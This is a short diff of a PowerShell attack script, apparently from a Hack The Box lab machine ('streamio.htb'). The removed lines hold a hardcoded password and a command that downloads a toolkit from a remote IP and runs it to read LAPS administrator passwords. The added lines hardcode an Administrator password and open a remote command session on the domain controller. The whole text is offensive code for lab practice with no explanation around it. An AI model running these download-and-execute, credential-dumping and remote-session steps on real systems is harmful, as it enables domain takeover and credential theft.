@@ -1,4 +1,4 @@
-$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
-
-iex(new-object net.webclient).downloadstring('http://10.10.14.20/LAPSToolkit.ps1');Get-LAPSComputers -Credential $cred
+$SecPassword = ConvertTo-SecureString 'ORVo5uSm$6-01o' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\Administrator', $SecPassword)
+$session = New-PSSession -ComputerName DC.STREAMIO.HTB -Credential $Cred
+Invoke-Command -computername DC.STREAMIO.HTB -ScriptBlock {whoami} -credential $Cred
